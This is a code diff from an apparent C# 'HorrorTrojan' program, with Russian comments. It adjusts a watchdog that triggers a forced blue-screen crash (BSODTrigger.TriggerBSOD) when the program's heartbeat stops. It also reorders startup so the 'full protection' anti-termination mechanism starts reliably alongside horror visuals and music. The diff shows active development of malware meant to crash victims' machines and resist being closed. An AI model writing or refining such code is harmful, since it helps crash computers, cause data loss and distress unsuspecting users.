@@ -161,10 +161,11 @@ namespace HorrorTrojan
         {
             while (watchdogAlive)
             {
-                Thread.Sleep(500);
+                Thread.Sleep(1000); // Проверка раз в секунду
                 try
                 {
-                    if ((DateTime.Now - lastPing).TotalSeconds > 3)
+                    // Увеличенный таймаут до 15 секунд
+                    if ((DateTime.Now - lastPing).TotalSeconds > 15)
                     {
                         StopMusic();
                         if (!bsodTriggered) BSODTrigger.TriggerBSOD();
@@ -200,11 +201,22 @@ namespace HorrorTrojan
         private void MainInterface_Load(object sender, EventArgs e)
         {
             startTime = DateTime.Now;
+            
+            // 1. Запускаем protectTimer для обновления lastPing
+            protectTimer.Start();
+            
+            // 2. Даем время на первый Tick (200 мс достаточно)
+            Thread.Sleep(200);
+            
+            // 3. Теперь безопасно запускаем watchdog
+            SetupFullProtection();
+            
+            // 4. Запускаем остальные таймеры
             bloodTimer.Start();
             drawTimer.Start();
-            protectTimer.Start();
+            
+            // 5. Воспроизводим музыку
             PlayMusic();
-            SetupFullProtection();
         }
 
         private void BloodTimer_Tick(object sender, EventArgs e)
